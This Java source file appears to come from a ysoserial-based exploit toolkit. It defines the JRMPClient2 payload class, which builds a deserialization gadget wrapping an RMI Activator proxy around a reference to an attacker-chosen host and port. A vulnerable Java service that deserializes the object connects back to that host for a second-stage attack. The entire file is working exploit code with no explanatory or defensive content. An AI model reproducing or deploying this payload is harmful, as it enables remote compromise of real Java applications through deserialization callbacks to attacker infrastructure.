package me.gv7.woodpecker.yso.payloads;

import java.lang.reflect.Proxy;
import java.rmi.activation.Activator;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

@SuppressWarnings ( {
    "restriction"
} )
@PayloadTest( harness="ysoserial.test.payloads.JRMPReverseConnectSMTest")
@Authors({ Authors.MBECHLER,Authors.C0NY1 })
public class JRMPClient2 extends PayloadRunner implements ObjectPayload<Activator> {
    public JRMPClient2() {
    }

    public Activator getObject(String command) throws Exception {
        String host;
        int port;
        int objId;

        String[] cmds = command.split("\\:");
        if(cmds.length == 1){
            host = cmds[0];
            port = new Random().nextInt(65535);
            objId = new Random().nextInt();
        }else if(cmds.length == 2){
            host = cmds[0];
            port = Integer.valueOf(cmds[1]);
            objId = new Random().nextInt();
        }else if(cmds.length == 3){
            host = cmds[0];
            port = Integer.valueOf(cmds[1]);
            objId = Integer.valueOf(cmds[2]);
        }else{
            throw new Exception("Usage: -a host:port:obj_id");
        }

        ObjID objID = new ObjID((new Random()).nextInt());
        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef);
        Activator object = (Activator)Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), new Class[]{Activator.class}, remoteObjectInvocationHandler);
        return object;
    }

    public static void main(String[] args) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());
        PayloadRunner.run(JRMPClient2.class, args);
    }
}
